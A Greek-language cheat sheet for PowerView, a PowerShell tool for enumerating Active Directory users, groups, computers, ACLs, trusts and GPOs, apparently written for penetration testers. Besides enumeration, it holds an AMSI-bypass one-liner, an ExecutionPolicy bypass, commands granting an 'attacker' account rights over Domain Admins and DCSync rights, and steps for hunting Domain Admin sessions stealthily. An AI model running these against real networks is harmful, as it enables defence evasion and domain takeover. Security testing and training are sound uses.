# ⚡ PowerView — Καταγραφή Active Directory μέσω PowerShell

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Καταγραφή Active Directory μέσω PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## Πριν ξεκινήσετε

Το **PowerView** προσθέτει λειτουργίες PowerShell για καταγραφή χρηστών, ομάδων, υπολογιστών, πολιτικών και δικαιωμάτων AD. Ορισμένες λειτουργίες τροποποιούν αντικείμενα ή ACLs· δεν είναι όλες αναγνωστικές.

**Βασικοί όροι:** *OU* = οργανωτική μονάδα, *GPO* = αντικείμενο πολιτικής ομάδας, *LDAP filter* = φίλτρο ερωτήματος καταλόγου, *ACL/ACE* = λίστα και εγγραφή δικαιωμάτων, *GUID* = μοναδικό αναγνωριστικό, *trust* = σχέση εμπιστοσύνης μεταξύ domains ή forests.

Το πρωτότυπο αναμειγνύει παλιότερα και νεότερα ονόματα λειτουργιών. Επιβεβαιώστε ποια έκδοση PowerView και PowerShell χρησιμοποιείτε. Ένα αποτέλεσμα ACL δεν σημαίνει από μόνο του ότι ο τρέχων λογαριασμός διαθέτει αποτελεσματικό δικαίωμα στο συγκεκριμένο αντικείμενο.

## 📋 Περιεχόμενα

- [🎯 Τι είναι το PowerView](#section-01)
- [🚀 Προετοιμασία περιβάλλοντος](#section-02)
- [🏢 Καταγραφή στοιχείων domain](#section-03)
- [👤 Συλλογή πληροφοριών χρηστών](#section-04)
- [👥 Καταγραφή ομάδων](#section-05)
- [💻 Καταγραφή υπολογιστών](#section-06)
- [🔐 Καταγραφή δικαιωμάτων ACL](#section-07)
- [🤝 Καταγραφή σχέσεων εμπιστοσύνης](#section-08)
- [📜 Καταγραφή αντικειμένων πολιτικής GPO](#section-09)
- [🎯 Στοχευμένη διερεύνηση](#section-10)
- [📊 Γρήγορη αναφορά](#section-11)
- [📚 Πηγές](#section-12)

---

<a id="section-01"></a>

## 🎯 Τι είναι το PowerView

Το **PowerView** είναι εργαλείο PowerShell για καταγραφή αντικειμένων και δικαιωμάτων AD, καθώς και ορισμένες αλλαγές ρυθμίσεων:

- 🔍 **Καταγραφή** — χρήστες, ομάδες, υπολογιστές και GPO
- 🔐 **ACLs** — αναζήτηση πιθανών λανθασμένων δικαιωμάτων
- 🌐 **Σχέσεις εμπιστοσύνης** — χαρτογράφηση σχέσεων domains
- 🎯 **Στοχευμένη διερεύνηση** — αναζήτηση ενδείξεων συνεδριών χρηστών

---

<a id="section-02"></a>

## 🚀 Προετοιμασία περιβάλλοντος

> **Ξεχωριστό εργαλείο και γενιές:** Το PowerView δεν είναι SharpHound ούτε θεωρείται δεδομένο ότι περιλαμβάνεται στο BloodHound. Το πρωτότυπο αναμειγνύει Get-Domain* με παλιότερα Invoke-UserHunter ονόματα. Το ExecutionPolicy δεν είναι μηχανισμός πλήρους παράκαμψης ελέγχων ασφάλειας και το ιστορικό AMSI snippet δεν λειτουργεί καθολικά. Πηγή: [PowerView στο PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).


### Λήψη PowerView

```powershell
# Από το αποθετήριο PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Περιγραφή του πρωτοτύπου για SharpHound· τα εργαλεία δεν είναι ταυτόσημα
# Το PowerView είναι ξεχωριστό εργαλείο· δεν θεωρείται δεδομένο ότι συνοδεύει BloodHound
```

### Εισαγωγή module

```powershell
# Αλλαγή πολιτικής εκτέλεσης για την τρέχουσα διεργασία
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Εισαγωγή module
Import-Module .\PowerView.ps1

# Εναλλακτικά, dot sourcing στην τρέχουσα συνεδρία
. .\PowerView.ps1
```

### Παράδειγμα αλλαγής συμπεριφοράς AMSI του πρωτοτύπου

```powershell
# Ιστορικό παράδειγμα αλλαγής εσωτερικού πεδίου AMSI· δεν είναι καθολική λύση
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

<a id="section-03"></a>

## 🏢 Καταγραφή στοιχείων domain

### Βασικές πληροφορίες domain

```powershell
# Πληροφορίες domain
Get-Domain

# Ανάγνωση SID domain
Get-DomainSID

# Ανάγνωση πολιτικής domain
Get-DomainPolicy

# Αναζήτηση domain controllers
Get-DomainController
Get-DomainController -Domain other.domain.local

# Πληροφορίες forest
Get-Forest
Get-ForestDomain
```

### Πολιτική domain

```powershell
# Πολιτική κωδικών
(Get-DomainPolicy)."SystemAccess"

# Πολιτική Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

<a id="section-04"></a>

## 👤 Συλλογή πληροφοριών χρηστών

> **Ιδιότητες και δικαιώματα:** AdminCount μπορεί να παραμένει μετά από παλιά συμμετοχή σε προστατευμένη ομάδα. Η λέξη pass σε περιγραφή δεν αποδεικνύει κωδικό. Οι ενδείξεις sessions είναι περιορισμένες από πρόσβαση, έκδοση Windows και χρόνο συλλογής.


### Κατάλογος χρηστών

```powershell
# Όλοι οι χρήστες
Get-DomainUser

# Συγκεκριμένος χρήστης
Get-DomainUser -Identity admin

# Ιδιότητες χρήστη
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Χρήστες με διαθέσιμη περιγραφή
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Αναζήτηση λογαριασμών ενδιαφέροντος

```powershell
# Χρήστες με SPN για περαιτέρω διερεύνηση Kerberoasting
Get-DomainUser -SPN

# Χρήστες χωρίς απαίτηση προταυτοποίησης, για έλεγχο AS-REP
Get-DomainUser -PreauthNotRequired

# Χρήστες με AdminCount· δεν αποδεικνύει τρέχουσα ιδιότητα διαχειριστή
Get-DomainUser -AdminCount

# Αναζήτηση της λέξης pass σε περιγραφές· δεν αποδεικνύει παρουσία πραγματικού κωδικού
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Συνεδρίες χρηστών

```powershell
# Αναζήτηση ενδείξεων θέσης συνεδρίας χρήστη
Find-DomainUserLocation -UserIdentity admin

# Έλεγχος τοπικής πρόσβασης διαχειριστή του τρέχοντος λογαριασμού
Find-LocalAdminAccess
```

---

<a id="section-05"></a>

## 👥 Καταγραφή ομάδων

### Κατάλογος ομάδων

```powershell
# Όλες οι ομάδες που επιστρέφει το ερώτημα
Get-DomainGroup

# Συγκεκριμένη ομάδα
Get-DomainGroup -Identity "Domain Admins"

# Μέλη ομάδας
Get-DomainGroupMember -Identity "Domain Admins"

# Μέλη μέσω αναδρομικής συμμετοχής
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Σημαντικές ομάδες

```powershell
# Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# Αναζήτηση ομάδων στις οποίες ανήκει ο χρήστης
Get-DomainGroup -UserName admin
```

### Τοπικές ομάδες

```powershell
# Μέλη τοπικής ομάδας διαχείρισης στον υπολογιστή
Get-NetLocalGroupMember -ComputerName server01

# Αναζήτηση μελών τοπικών ομάδων στο καθορισμένο εύρος
Find-DomainLocalGroupMember -GroupName Administrators
```

---

<a id="section-06"></a>

## 💻 Καταγραφή υπολογιστών

### Κατάλογος υπολογιστών

```powershell
# Υπολογιστές που επιστρέφει το ερώτημα
Get-DomainComputer

# Συγκεκριμένος υπολογιστής
Get-DomainComputer -Identity server01

# Ιδιότητες
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Υπολογιστές με μη περιορισμένη ανάθεση
Get-DomainComputer -Unconstrained
```

### Αναζήτηση συστημάτων ενδιαφέροντος

```powershell
# Domain Controllers
Get-DomainController

# Servers
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Ενδείξεις παλιότερου λειτουργικού
Get-DomainComputer -OperatingSystem "*2008*"
```

### Κοινόχρηστοι φάκελοι

> **Πρόσβαση δεν σημαίνει εγγραφή:** Το CheckShareAccess ελέγχει διαθέσιμη πρόσβαση στο share, χωρίς να αποδεικνύει γενικά ότι είναι writable. Χρειάζεται συγκεκριμένη, επιτρεπόμενη επαλήθευση των αντίστοιχων δικαιωμάτων.


```powershell
# Αναζήτηση κοινόχρηστων φακέλων
Find-DomainShare

# Έλεγχος διαθέσιμης πρόσβασης σε shares· δεν συνεπάγεται υποχρεωτικά εγγραφή
Find-DomainShare -CheckShareAccess

# Αναζήτηση αρχείων ενδιαφέροντος σε shares
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

<a id="section-07"></a>

## 🔐 Καταγραφή δικαιωμάτων ACL

> **Αποτελεσματικά δικαιώματα:** Εξετάστε principal, αντικείμενο, κληρονόμηση, είδος ACE, αρνήσεις και συνδυασμό δικαιωμάτων. Ένα regex Replication-Get ή GenericAll δεν αποδεικνύει μόνο του DCSync. Τα Add-DomainObjectAcl παραδείγματα αλλάζουν το περιβάλλον.


### Βασικός έλεγχος ACL

```powershell
# ACL του επιλεγμένου χρήστη
Get-DomainObjectAcl -Identity admin

# Αντιστοίχιση GUID σε αναγνώσιμα ονόματα
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Συγκεκριμένα δικαιώματα
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Αναζήτηση δικαιωμάτων ενδιαφέροντος

```powershell
# Αναζήτηση GenericAll στο επιλεγμένο αντικείμενο και SID
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### Δικαιώματα DCSync

```powershell
# Αναζήτηση ενδείξεων δικαιωμάτων αναπαραγωγής· χρειάζεται έλεγχος συνδυασμού και scope
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Τροποποίηση ACL

```powershell
# Προσθήκη GenericAll στον επιλεγμένο λογαριασμό
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Προσθήκη δικαιωμάτων DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

<a id="section-08"></a>

## 🤝 Καταγραφή σχέσεων εμπιστοσύνης

### Σχέσεις εμπιστοσύνης domains

```powershell
# Καταγραφή σχέσεων εμπιστοσύνης
Get-DomainTrust

# Σχέσεις εμπιστοσύνης του επιλεγμένου domain
Get-DomainTrust -Domain domain.local

# Χαρτογράφηση διαθέσιμων σχέσεων εμπιστοσύνης
Get-DomainTrustMapping
```

### Σχέσεις εμπιστοσύνης forests

```powershell
# Σχέσεις εμπιστοσύνης forests
Get-ForestTrust

# Domains του forest
Get-ForestDomain
```

### Τύποι σχέσεων εμπιστοσύνης

| Τύπος σχέσης | Κατεύθυνση | Περιγραφή |
|------------|-----------|-------------|
| Αμφίδρομη | Δύο κατευθύνσεις | Τα δύο domains εμπιστεύονται το ένα το άλλο |
| Inbound — εισερχόμενη εμπιστοσύνη ως προς το domain αναφοράς | Μία κατεύθυνση | Το άλλο domain εμπιστεύεται το domain αναφοράς |
| Outbound — εξερχόμενη εμπιστοσύνη ως προς το domain αναφοράς | Μία κατεύθυνση | Το domain αναφοράς εμπιστεύεται το άλλο domain |

---

<a id="section-09"></a>

## 📜 Καταγραφή αντικειμένων πολιτικής GPO

> **Συσχετίσεις και φίλτρα:** Το ComputerIdentity του δείγματος επιλέγει υπολογιστή, όχι OU. Η εύρεση ACE με WriteProperty/GenericAll δεν αποδεικνύει ότι ο τρέχων χρήστης έχει αυτό το δικαίωμα. Χρειάζεται αντιστοίχιση principal, πεδίου και εφαρμογής GPO.


### Κατάλογος GPO

```powershell
# Καταγραφή GPO
Get-DomainGPO

# Επιλογή GPO βάσει ονόματος
Get-DomainGPO -Identity "Default Domain Policy"

# Το παράδειγμα επιλέγει υπολογιστή, όχι OU
Get-DomainGPO -ComputerIdentity server01
```

### Αναζήτηση δικαιωμάτων σε GPO

```powershell
# Αναζήτηση ACE με σχετικά δικαιώματα· δεν αποδεικνύει ότι ανήκουν στον τρέχοντα χρήστη
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### Συσχέτιση GPO με συστήματα και οργανωτικές μονάδες

```powershell
# Οργανωτικές μονάδες με σχετική σύνδεση GPO
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO που σχετίζονται με συγκεκριμένο υπολογιστή
Get-DomainGPO -ComputerIdentity "server01"
```

---

<a id="section-10"></a>

## 🎯 Στοχευμένη διερεύνηση

### Αναζήτηση τοπικών δικαιωμάτων διαχειριστή

```powershell
# Σε ποιους υπολογιστές διαθέτει ο λογαριασμός τοπικά δικαιώματα διαχειριστή;
Find-LocalAdminAccess

# Με παράλληλες εργασίες
Find-LocalAdminAccess -Threads 10

# Σε συγκεκριμένους υπολογιστές
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Αναζήτηση θέσεων συνεδριών χρηστών

```powershell
# Πού υπάρχουν ενδείξεις συνεδρίας του χρήστη;
Find-DomainUserLocation

# Συγκεκριμένος χρήστης
Find-DomainUserLocation -UserIdentity admin

# Επιπλέον έλεγχος πρόσβασης στα αντίστοιχα συστήματα
Find-DomainUserLocation -CheckAccess
```

### Αναζήτηση συνεδριών

```powershell
# Ενδείξεις συνεδριών στο σύστημα
Get-NetSession -ComputerName dc01

# Ενδείξεις συνδεδεμένων χρηστών
Get-NetLoggedon -ComputerName server01

# Συνεδρίες RDP
Get-NetRDPSession -ComputerName server01
```

### Στοχευμένη αναζήτηση χρηστών

```powershell
# Αναζήτηση ενδείξεων συνεδριών Domain Admins
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Παράδειγμα παλιάς λειτουργίας UserHunter· ελέγξτε την έκδοση
Invoke-UserHunter

# Επιλογή περιορισμού δραστηριότητας, όπου υποστηρίζεται
Invoke-UserHunter -Stealth
```

---

<a id="section-11"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Εντολή | Περιγραφή |
|---------|-------------|
| `Get-Domain` | Πληροφορίες domain |
| `Get-DomainUser` | Καταγραφή χρηστών |
| `Get-DomainGroup` | Καταγραφή ομάδων |
| `Get-DomainComputer` | Καταγραφή υπολογιστών |
| `Get-DomainController` | Κατάλογος domain controllers |
| `Get-DomainTrust` | Κατάλογος σχέσεων εμπιστοσύνης |
| `Get-DomainGPO` | Κατάλογος GPO |
| `Find-LocalAdminAccess` | Αναζήτηση δικαιωμάτων διαχειριστή |
| `Find-DomainUserLocation` | Αναζήτηση συνεδριών χρηστών |

### Λογαριασμοί για διερεύνηση Kerberos

| Εντολή | Περιγραφή |
|---------|-------------|
| `Get-DomainUser -SPN` | Λογαριασμοί με SPN· απαιτούνται επιπλέον προϋποθέσεις |
| `Get-DomainUser -PreauthNotRequired` | Λογαριασμοί χωρίς απαίτηση preauthentication |
| `Get-DomainComputer -Unconstrained` | Μη περιορισμένη ανάθεση ταυτοποίησης |

### Συνήθη φίλτρα

```powershell
# Επιλογή ιδιοτήτων
Get-DomainUser -Properties samaccountname,description

# Φίλτρο LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Συνθήκη Where
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Ροή εργασίας ελέγχου

```powershell
# 1. Εισαγωγή module
Import-Module .\PowerView.ps1

# 2. Καταγραφή στοιχείων domain
Get-Domain
Get-DomainController

# 3. Αναζήτηση χρηστών
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Έλεγχος τοπικής πρόσβασης διαχειριστή
Find-LocalAdminAccess

# 5. Στοχευμένη αναζήτηση συνεδριών
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Εξέταση ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

<a id="section-12"></a>

## 📚 Πηγές

- [Κώδικας PowerView στο GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Ιστολόγιο HarmJ0y](https://blog.harmj0y.net/)
- [Οδηγός αναφοράς PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Σχετικοί οδηγοί
- [BloodHound](../../BloodHound/translations/README.el.md)
- [PowerShell](../../PowerShell/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

<p align="center">
  <b>⚡ Οργανώστε την καταγραφή AD μέσω PowerShell!</b><br>
  <i>PowerView — αντικείμενα, πολιτικές και δικαιώματα AD</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
